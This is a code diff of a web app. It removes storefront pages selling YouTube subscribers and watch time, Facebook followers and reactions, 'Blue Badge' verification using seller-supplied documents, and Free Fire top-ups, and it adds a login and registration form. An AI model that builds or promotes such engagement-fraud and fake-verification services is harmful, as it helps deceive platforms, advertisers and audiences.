-            <div @click="selectYtPlan('Subscribe Membership', 78)" :class="ytPlanName === 'Subscribe Membership' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
-                <h4 class="font-bold text-sm text-white">Subscribe Membership</h4>
-                <div class="flex items-center gap-2 my-1">
-                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(78)"></span>
-                    <span class="text-xs text-gray-500 line-through">৳78</span>
-                </div>
-                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Country: Asia</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Delivery time: Instant</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Subscribers: 1,000</li>
-                </ul>
-            </div>
-
-            <div @click="selectYtPlan('Wachtime Membership', 338)" :class="ytPlanName === 'Wachtime Membership' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
-                <h4 class="font-bold text-sm text-white">Wachtime Membership</h4>
-                <div class="flex items-center gap-2 my-1">
-                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(338)"></span>
-                    <span class="text-xs text-gray-500 line-through">৳338</span>
-                </div>
-                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> 1,000 Hours Watchtime </li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Non Drop & Organic</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Instant Delivery</li>
-                </ul>
-            </div>
-
-            <div @click="selectYtPlan('Monetization Membership', 1199)" :class="ytPlanName === 'Monetization Membership' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
-                <span class="absolute top-3 right-3 bg-emerald-600 text-[9px] text-white px-2 py-0.5 rounded-full font-bold uppercase">Most Popular</span>
-                <h4 class="font-bold text-sm text-white">Monetization Membership</h4>
-                <div class="flex items-center gap-2 my-1">
-                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(1199)"></span>
-                    <span class="text-xs text-gray-500 line-through">৳1199</span>
-                </div>
-                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Views: 50,000+</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Watch Time: 4,000 Hour</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Subscribers: 1,000</li>
-                </ul>
-            </div>
-
-            <div @click="selectYtPlan('Premium Membership', 1499)" :class="ytPlanName === 'Premium Membership' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
-                <h4 class="font-bold text-sm text-white">Premium Membership</h4>
-                <div class="flex items-center gap-2 my-1">
-                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(1499)"></span>
-                    <span class="text-xs text-gray-500 line-through">৳1499</span>
-                </div>
-                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Views: 1,20,000+</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Watch Time: 4,500+ Hour</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Subscribers: 10,000</li>
-                </ul>
-            </div>
-
-            <div @click="selectYtPlan('Artist Verification', 171)" :class="ytPlanName === 'Artist Verification' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="relative border rounded-2xl p-4 cursor-pointer transition">
-                <span class="absolute top-3 right-3 bg-purple-600 text-[9px] text-white px-2 py-0.5 rounded-full font-bold uppercase">OAC Badge</span>
-                <h4 class="font-bold text-sm text-white flex items-center gap-1.5">
-                    Artist Verification <i class="fas fa-music text-purple-400 text-xs"></i>
-                </h4>
-                <div class="flex items-center gap-2 my-1">
-                    <span class="text-xl font-bold text-white" x-text="'৳' + calcPriceOnSite(171)"></span>
-                    <span class="text-xs text-gray-500 line-through">৳171</span>
-                </div>
-                <ul class="text-[11px] text-gray-300 space-y-1 mt-2 border-t border-zinc-800/80 pt-2">
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Official Artist Channel Badge (🎵)</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Music Distribution: Included</li>
-                    <li><i class="fas fa-check text-emerald-400 mr-1.5"></i> Delivery: 5-7 Working Days</li>
-                </ul>
-            </div>
-        </div>
-
-        <button @click="ytPlanName ? navigateTo('youtube-activation') : null" :disabled="!ytPlanName" :class="!ytPlanName ? 'opacity-50 cursor-not-allowed' : ''" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl text-xs transition tracking-wide">
-            Proceed to Activation
+        <div class="divider">OR</div>
+        
+        <button class="btn btn-google" onclick="googleLogin()">
+            <span class="google-icon">G</span> Register with Google
         </button>
-    </div>
-
-    <!-- YouTube Activation -->
-    <div x-cloak x-show="currentPage === 'youtube-activation'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="pt-1">
-            <button @click="ytPlanName = ''; ytPlanBasePrice = 0; navigateTo('youtube')" class="p-1.5 hover:bg-zinc-800 rounded-full transition text-zinc-400">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-        </div>
-
-        <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3 flex items-center justify-between">
-            <span class="text-sm font-black text-emerald-500" x-text="'Selected: ' + ytPlanName + ' (৳' + calcCheckoutPrice(ytPlanBasePrice, ytPromo) + ')'"></span>
-            <span class="bg-zinc-800 text-white text-[10px] font-bold px-2 py-0.5 rounded">PROMO OFFER</span>
-        </div>
-
-        <div id="main-card" class="bg-zinc-950 border border-zinc-800 text-white rounded-2xl p-5 shadow-lg">
-            <div class="flex items-center gap-2 mb-4">
-                <i class="fab fa-youtube text-red-500 text-lg"></i>
-                <h2 class="text-xs font-bold uppercase tracking-wider text-zinc-400">Confirm Channel Handle</h2>
-            </div>
-
-            <div x-show="!ytChannelData" class="mb-4">
-                <input type="text" x-model="ytHandleInput" placeholder="@channelhandle" class="w-full bg-zinc-900 border border-zinc-700 text-center font-medium py-3 rounded-xl focus:outline-none text-base text-white focus:border-emerald-500 transition">
-            </div>
-
-            <div x-show="ytChannelData" class="bg-zinc-900 text-white rounded-xl p-4 mb-4 relative border border-zinc-800">
-                <button @click="resetYtSearch()" class="absolute top-2 right-2 text-zinc-500 hover:text-white"><i class="fas fa-times-circle"></i></button>
-                <div class="flex items-center gap-3 mb-4">
-                    <template x-if="ytChannelData?.avatar">
-                        <img :src="ytChannelData.avatar" alt="Avatar" class="w-12 h-12 rounded-full border border-zinc-700">
-                    </template>
-                    <template x-if="!ytChannelData?.avatar">
-                        <div class="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center text-white text-xl"><i class="fab fa-youtube"></i></div>
-                    </template>
-                    <div>
-                        <h4 class="font-bold text-sm text-white" x-text="ytChannelData?.title"></h4>
-                        <p class="text-xs text-zinc-500" x-text="ytChannelData?.handle"></p>
-                    </div>
-                </div>
-                <div class="grid grid-cols-3 gap-2 text-center text-[11px]">
-                    <div class="bg-zinc-950 p-2 rounded-lg border border-zinc-800"><span class="block font-bold text-xs text-khait" x-text="ytChannelData?.subs"></span><span class="text-zinc-400">Subscribers</span></div>
-                    <div class="bg-zinc-950 p-2 rounded-lg border border-zinc-800"><span class="block font-bold text-xs text-whait" x-text="ytChannelData?.videos"></span><span class="text-zinc-400">Videos</span></div>
-                    <div class="bg-zinc-950 p-2 rounded-lg border border-zinc-800"><span class="block font-bold text-xs text-whait" x-text="ytChannelData?.views"></span><span class="text-zinc-400">Views</span></div>
-                </div>
-            </div>
-
-            <div x-show="!ytChannelData" class="flex justify-center mb-2">
-                <button @click="searchYtChannel()" class="w-12 h-12 bg-green-600 hover:bg-green-700 text-white rounded-full font-bold text-xs flex items-center justify-center shadow-md transition-all">
-                    <span x-show="!isYtSearching">OK</span>
-                    <i x-show="isYtSearching" class="fas fa-circle-notch animate-spin"></i>
-                </button>
-            </div>
-            <p x-show="ytSearchError" class="text-center text-xs text-red-500 mt-2" x-text="ytSearchError"></p>
-        </div>
-
-        <div class="space-y-3">
-            <div>
-                <input type="text" x-model="ytPromo" placeholder="Enter Promo Code *" class="w-full bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl focus:outline-none focus:border-emerald-500 text-xs text-white tracking-wider">
-                
-                <p class="text-[11px] mt-1.5 font-semibold">
-                    <span x-show="ytPromo.trim() === ''" class="text-amber-400">Use promo code for <span x-text="discountSettings.percent"></span>% discount</span>
-                    <span x-show="ytPromo.trim() !== '' && ytPromo.trim() !== getLivePromoCode()" class="text-red-500">সঠিক প্রমোকোড পেতে এডমিনকে মেসেজ দিন।</span>
-                    <span x-show="ytPromo.trim() !== '' && ytPromo.trim() === getLivePromoCode()" class="text-green-400"><i class="fas fa-check-circle mr-1"></i> প্রমোকোডটি সফলভাবে যুক্ত হয়েছে! আপনি ডিসকাউন্ট পেয়েছেন।</span>
-                </p>
-            </div>
-            
-            <div class="bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl text-zinc-400 font-medium text-xs" x-text="ytPlanName"></div>
-            
-            <select x-model="ytCountry" class="w-full bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl focus:outline-none focus:border-emerald-500 text-xs text-white">
-                <option value="Bangladesh">Bangladesh</option>
-                <option value="India">India</option>
-                <option value="Pakistan">Pakistan</option>
-            </select>
-
-            <button @click="handleYtActivationSubmit()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl transition text-xs tracking-wide shadow-md">
-                Activate Plan
-            </button>
-        </div>
-    </div>
-
-    <!-- Facebook Page -->
-    <div x-cloak x-show="currentPage === 'facebook'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="flex items-center gap-3 py-2 border-b border-zinc-800">
-            <button @click="navigateTo('home')" class="p-1.5 hover:bg-zinc-800 rounded-full transition text-zinc-400">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <i data-lucide="users" class="w-6 h-6 text-blue-500"></i>
-            <h1 class="text-base font-bold text-white">Facebook Membership</h1>
-        </div>
-
-        <div class="bg-gradient-to-r from-blue-600/10 to-indigo-600/20 border border-blue-500/20 rounded-2xl p-4 text-center">
-            <i class="fab fa-facebook-f text-blue-500 text-3xl mb-1"></i>
-            <h2 class="text-base font-bold mb-0.5 text-white">Facebook Boost Plan</h2>
-            <p class="text-xs text-gray-400 mb-2">Grow your page organically & unlock monetization quickly!</p>
-            <span class="bg-blue-600 text-white text-[10px] px-2.5 py-1 rounded font-bold uppercase" x-text="'🔥 Limited Offer - ' + discountSettings.percent + '% OFF'"></span>
-        </div>
-
-        <div class="space-y-3">
-            <h3 class="font-bold text-gray-300 text-xs uppercase tracking-wider">Choose Your Package</h3>
-
-            <div @click="selectFbPlan('Facebook Followers', 69)" :class="fbPlanName === 'Facebook Followers' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="p-4 border rounded-xl cursor-pointer transition group hover:border-zinc-700">
-                <div class="flex justify-between items-center">
-                    <h4 class="font-bold text-white text-xs">Facebook Followers</h4>
-                    <span class="text-[10px] bg-zinc-800 text-zinc-400 px-2 py-0.5 rounded font-bold uppercase tracking-wide">Profile</span>
-                </div>
-                <div class="flex items-baseline gap-2 mt-1.5 mb-3 border-b border-zinc-900 pb-3">
-                    <span class="text-base font-black text-white" x-text="'৳' + calcPriceOnSite(69)"></span>
-                    <span class="text-xs text-zinc-500 line-through">৳69</span>
-                </div>
-                <div class="space-y-1.5">
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ 5,000 Profile Followers</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Premium & Non-Drop Pack</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Global Active Accounts</span>
-                    </div>
-                </div>
-            </div>
-
-            <div @click="selectFbPlan('Facebook Page Followers', 84)" :class="fbPlanName === 'Facebook Page Followers' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="p-4 border rounded-xl cursor-pointer transition group hover:border-zinc-700">
-                <div class="flex justify-between items-center">
-                    <h4 class="font-bold text-white text-xs">Facebook Page Followers</h4>
-                    <span class="text-[10px] bg-blue-600 text-white px-2 py-0.5 rounded font-bold uppercase tracking-wide">Best Seller</span>
-                </div>
-                <div class="flex items-baseline gap-2 mt-1.5 mb-3 border-b border-zinc-900 pb-3">
-                    <span class="text-base font-black text-white" x-text="'৳' + calcPriceOnSite(84)"></span>
-                    <span class="text-xs text-zinc-500 line-through">৳84</span>
-                </div>
-                <div class="space-y-1.5">
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ 5,000 Page Followers & Likes</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ 100% Safe & Lifetime Guarantee</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Bangladeshi Real Users</span>
-                    </div>
-                </div>
-            </div>
-
-            <div @click="selectFbPlan('Standard Monetizer Package', 460)" :class="fbPlanName === 'Standard Monetizer Package' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="p-4 border rounded-xl cursor-pointer transition group hover:border-zinc-700">
-                <div class="flex justify-between items-center">
-                    <h4 class="font-bold text-white text-xs">Standard Monetizer Package</h4>
-                    <span class="text-[10px] bg-blue-600 text-white px-2 py-0.5 rounded font-bold uppercase tracking-wide">Popular</span>
-                </div>
-                <div class="flex items-baseline gap-2 mt-1.5 mb-3 border-b border-zinc-900 pb-3">
-                    <span class="text-base font-black text-white" x-text="'৳' + calcPriceOnSite(460)"></span>
-                    <span class="text-xs text-zinc-500 line-through">৳460</span>
-                </div>
-                <div class="space-y-1.5">
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ 10,000 followers & 500K+ Organic Reach</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ 60,000 Minutes watchtime</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Premium & Real Engagement</span>
-                    </div>
-                </div>
-            </div>
-
-            <div @click="selectFbPlan('Facebook Post Reaction', 45)" :class="fbPlanName === 'Facebook Post Reaction' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="p-4 border rounded-xl cursor-pointer transition group hover:border-zinc-700">
-                <div class="flex justify-between items-center">
-                    <h4 class="font-bold text-white text-xs">Facebook Post Reaction</h4>
-                    <span class="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded font-bold" x-text="discountSettings.percent + '% OFF'"></span>
-                </div>
-                <div class="flex items-baseline gap-2 mt-1.5 mb-3 border-b border-zinc-900 pb-3">
-                    <span class="text-base font-black text-white" x-text="'৳' + calcPriceOnSite(45)"></span>
-                    <span class="text-xs text-zinc-500 line-through">৳45</span>
-                </div>
-                <div class="space-y-1.5">
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Instant Reactions (Like/Love/Wow)</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Safe & Non-Drop Pack</span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Bangladeshi Active Profiles</span>
-                    </div>
-                </div>
-            </div>
-
-            <div @click="selectFbPlan('Facebook Profile/Page Verify', 60)" :class="fbPlanName === 'Facebook Profile/Page Verify' ? 'border-emerald-500 bg-emerald-500/10' : 'border-zinc-800 bg-zinc-950'" class="p-4 border rounded-xl cursor-pointer transition group hover:border-zinc-700">
-                <div class="flex justify-between items-center">
-                    <h4 class="font-bold text-white text-xs">Blue Badge Verify</h4>
-                    <span class="text-[10px] bg-purple-600 text-white px-2 py-0.5 rounded font-bold uppercase tracking-wide">Blue Badge</span>
-                </div>
-                <div class="flex items-baseline gap-2 mt-1.5 mb-3 border-b border-zinc-900 pb-3">
-                    <span class="text-base font-black text-white" x-text="'৳' + calcPriceOnSite(60)"></span>
-                    <span class="text-xs text-zinc-500 line-through">৳60</span>
-                </div>
-                <div class="space-y-1.5">
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Instant Delivery </span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Lifetime Verified </span>
-                    </div>
-                    <div class="flex items-start gap-2 text-[11px] font-medium text-zinc-400">
-                        <i data-lucide="check" class="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5"></i>
-                        <span>✓ Profile/Page Verification Submission (Our Document) </span>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="p-1">
-            <button @click="fbPlanName ? navigateTo('facebook-activation') : null" :disabled="!fbPlanName" :class="!fbPlanName ? 'opacity-50 cursor-not-allowed' : ''" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl text-xs transition tracking-wide shadow-md">
-                Proceed to Activation
-            </button>
-        </div>
-    </div>
-
-    <!-- Facebook Activation -->
-    <div x-cloak x-show="currentPage === 'facebook-activation'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="flex items-center gap-3 py-2 border-b border-zinc-800">
-            <button @click="fbPlanName = ''; fbPlanBasePrice = 0; navigateTo('facebook')" class="p-1.5 hover:bg-zinc-800 rounded-full transition text-zinc-400">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <i data-lucide="shield-check" class="w-6 h-6 text-emerald-500"></i>
-            <h1 class="text-base font-bold text-white">Activation Panel</h1>
-        </div>
-
-        <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3 flex items-center justify-between">
-            <span class="text-sm font-black text-emerald-500" x-text="'Selected: ' + fbPlanName + ' (৳' + calcCheckoutPrice(fbPlanBasePrice, fbPromo) + ')'"></span>
-            <span class="bg-zinc-800 text-white text-[10px] font-bold px-2 py-0.5 rounded">PROMO OFFER</span>
-        </div>
-
-        <div class="bg-zinc-950 border border-zinc-800 text-white rounded-2xl p-5 shadow-lg">
-            <div class="flex items-center gap-2 mb-4">
-                <i class="fab fa-facebook text-blue-500 text-lg"></i>
-                <h2 class="text-xs font-bold uppercase tracking-wider text-zinc-400">Confirm Page / Profile Link</h2>
-            </div>
-
-            <div class="mb-2">
-                <input type="url" x-model="fbLink" placeholder="https://facebook.com/yourpage" class="w-full bg-zinc-900 border border-zinc-700 font-medium py-3 px-4 rounded-xl focus:outline-none text-xs text-white focus:border-emerald-500 transition">
-            </div>
-        </div>
-
-        <div class="space-y-3">
-            <div>
-                <input type="text" x-model="fbPromo" placeholder="Enter Promo Code *" class="w-full bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl focus:outline-none focus:border-emerald-500 text-xs text-white tracking-wider">
-                
-                <p class="text-[11px] mt-1.5 font-semibold">
-                    <span x-show="fbPromo.trim() === ''" class="text-amber-400">Use promo code for <span x-text="discountSettings.percent"></span>% discount</span>
-                    <span x-show="fbPromo.trim() !== '' && fbPromo.trim() !== getLivePromoCode()" class="text-red-500">সঠিক প্রমোকোড পেতে এডমিনকে মেসেজ দিন।</span>
-                    <span x-show="fbPromo.trim() !== '' && fbPromo.trim() === getLivePromoCode()" class="text-green-400"><i class="fas fa-check-circle mr-1"></i> প্রমোকোডটি সফলভাবে যুক্ত হয়েছে! আপনি ডিসকাউন্ট পেয়েছেন।</span>
-                </p>
-            </div>
-            
-            <div class="bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl text-zinc-400 font-medium text-xs" x-text="fbPlanName"></div>
-            
-            <select x-model="fbCountry" class="w-full bg-zinc-950 border border-zinc-800 px-4 py-3 rounded-xl focus:outline-none focus:border-emerald-500 text-xs text-white">
-                <option value="bangladesh">Bangladesh</option>
-                <option value="india">India</option>
-                <option value="pakistan">Pakistan</option>
-            </select>
-
-            <button @click="handleFbActivation()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl transition text-xs tracking-wide shadow-md">
-                Activate Plan
-            </button>
-        </div>
-    </div>
-
-    <!-- Free Fire Topup -->
-    <div x-cloak x-show="currentPage === 'free-fire-topup'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl pb-6">
-        <div class="bg-[#0d5c2e] px-4 py-4 text-white flex items-center justify-between shadow-lg">
-            <button @click="navigateTo('home')" class="p-1.5 hover:bg-white/10 rounded-full transition text-white">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <h1 class="text-sm font-bold tracking-wide">Free Fire Diamond TopUp</h1>
-            <div class="w-7"></div>
-        </div>
         
-        <div class="p-4 space-y-4">
-            <div class="bg-gradient-to-r from-green-600/20 to-emerald-600/20 border border-green-500/30 rounded-xl p-4 text-center shadow-inner">
-                <div class="flex items-center justify-center gap-1 mb-1 text-green-400">
-                    <i data-lucide="percent" class="w-5 h-5"></i>
-                    <span class="text-xl font-black" x-text="discountSettings.percent + '% INSTANT OFF'"></span>
-                </div>
-                <p class="text-[11px] text-zinc-300" x-text="'সকল ফ্রি ফায়ার ডায়মন্ড ও লেভেল আপ বান্ডেলে ' + discountSettings.percent + '% ছাড় চলছে!'"></p>
-            </div>
-
-            <h3 class="text-xs font-bold text-zinc-400 uppercase tracking-wider">সার্ভিস ক্যাটাগরি</h3>
-            <div class="space-y-2.5">
-                <div @click="navigateTo('uid-topup-bd')" class="bg-zinc-950 border border-zinc-800 p-3 rounded-xl flex items-center gap-3 cursor-pointer hover:border-emerald-500 transition shadow-md">
-                    <div class="w-11 h-11 bg-zinc-800 rounded-lg flex items-center justify-center text-lg">🎮</div>
-                    <div class="flex-1">
-                        <h4 class="font-bold text-white text-xs">UID Topup [BD]</h4>
-                        <p class="text-zinc-400 text-[10px]">Instant diamond delivery within 5 mins</p>
-                    </div>
-                </div>
-
-                <div @click="navigateTo('level-up-package')" class="bg-zinc-950 border border-zinc-800 p-3 rounded-xl flex items-center gap-3 cursor-pointer hover:border-emerald-500 transition shadow-md">
-                    <div class="w-11 h-11 bg-zinc-800 rounded-lg flex items-center justify-center text-lg">💎</div>
-                    <div class="flex-1">
-                        <h4 class="font-bold text-white text-xs">Level Up Package Boost</h4>
-                        <p class="text-zinc-400 text-[10px]">Premium level up subscription rewards</p>
-                    </div>
-                </div>
-            </div>
+        <div id="registerMessage" class="message"></div>
+        <div class="switch-link">
+            Already have an account? <a onclick="showLogin()">Login here</a>
         </div>
     </div>
 
-    <!-- Level Up Package -->
-    <div x-cloak x-show="currentPage === 'level-up-package'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="flex items-center gap-3 bg-zinc-950 p-3 rounded-xl border border-zinc-800 shadow-sm">
-            <button @click="navigateTo('free-fire-topup')" class="text-zinc-400 hover:bg-zinc-800 rounded-full p-1.5 transition">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <div class="w-10 h-10 bg-emerald-600 text-white rounded-xl flex items-center justify-center text-lg font-bold">💎</div>
-            <div>
-                <h2 class="text-sm font-bold text-white">Level Up Package</h2>
-                <p class="text-zinc-400 text-[10px]">Game Account Top up Module</p>
-            </div>
+    <!-- ========== Login Form ========== -->
+    <div id="loginForm" class="hidden">
+        <div class="form-group">
+            <label>📱 Email or Phone</label>
+            <input type="text" id="loginEmailOrNumber" placeholder="Enter email or phone" required>
         </div>
-
-        <div class="space-y-4">
-            <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5 space-y-2">
-                <h3 class="text-xs font-bold text-zinc-400">1. সিলেক্ট রিচার্জ প্যাক</h3>
-                <div @click="selectLevelUpPkg('full-level-up', 'Full Level Up (1270 Diamond)', 400)" :class="lvlPkgId === 'full-level-up' ? 'border-emerald-500 bg-emerald-500/5' : 'border-zinc-800 bg-zinc-900'" class="cursor-pointer border rounded-xl p-3 transition flex items-center justify-between">
-                    <div>
-                        <div class="text-white font-medium text-xs">Full Level Up <span class="text-zinc-400 font-normal">(1270 Diamond Max)</span></div>
-                        <div class="text-emerald-400 font-bold text-base mt-0.5" x-text="calcCheckoutPrice(400, lvlPromoCode) + ' TK '"><span class="text-xs text-zinc-500 line-through">400 TK</span></div>
-                    </div>
-                    <div :class="lvlPkgId === 'full-level-up' ? 'bg-emerald-500' : 'bg-zinc-800'" class="w-4 h-4 rounded-full border border-zinc-700 flex items-center justify-center">
-                        <div class="w-1.5 h-1.5 bg-white rounded-full"></div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5 space-y-3">
-                <h3 class="text-xs font-bold text-zinc-400">2. প্লেয়ার ইনফরমেশন</h3>
-                <div>
-                    <input type="text" x-model="lvlGameUid" placeholder="Enter Your Game UID *" class="w-full px-3 py-2.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500">
-                </div>
-                <div>
-                    <input type="text" x-model="lvlPromoCode" placeholder="Enter Promo Code *" class="w-full px-3 py-2.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white focus:outline-none tracking-wider focus:border-emerald-500">
-                    
-                    <p class="text-[11px] mt-1.5 font-semibold">
-                        <span x-show="lvlPromoCode.trim() === ''" class="text-amber-400">Use promo code for <span x-text="discountSettings.percent"></span>% discount</span>
-                        <span x-show="lvlPromoCode.trim() !== '' && lvlPromoCode.trim() !== getLivePromoCode()" class="text-red-500">সঠিক প্রমোকোড পেতে এডমিন কে মেসেজ দিন।</span>
-                        <span x-show="lvlPromoCode.trim() !== '' && lvlPromoCode.trim() === getLivePromoCode()" class="text-green-400"><i class="fas fa-check-circle mr-1"></i> প্রমোকোডটি সফলভাবে যুক্ত হয়েছে! আপনি ডিসকাউন্ট পেয়েছেন।</span>
-                    </p>
-                </div>
-            </div>
-
-            <button @click="handleLevelUpPurchase()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white py-3 rounded-xl font-bold text-xs transition shadow-md">
-                Purchase Now
-            </button>
+        <div class="form-group">
+            <label>🔒 Password</label>
+            <input type="password" id="loginPassword" placeholder="Enter password" required>
         </div>
-    </div>
-
-    <!-- UID Topup -->
-    <div x-cloak x-show="currentPage === 'uid-topup-bd'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="bg-zinc-950 p-3 rounded-xl border border-zinc-800 flex items-center gap-3">
-            <button @click="navigateTo('free-fire-topup')" class="text-zinc-400 hover:bg-zinc-800 rounded-full p-1.5 transition">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <div class="w-10 h-10 bg-emerald-600 text-white rounded-xl flex items-center justify-center text-lg">🎮</div>
-            <div>
-                <h2 class="text-sm font-bold text-white">UID Topup [BD]</h2>
-                <p class="text-zinc-400 text-[10px]">Official Direct Region Topup</p>
-            </div>
-        </div>
-
-        <div class="space-y-4">
-            <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3">
-                <h3 class="text-xs font-bold text-zinc-400 mb-2">1. সিলেক্ট রিচার্জ প্যাকেজ</h3>
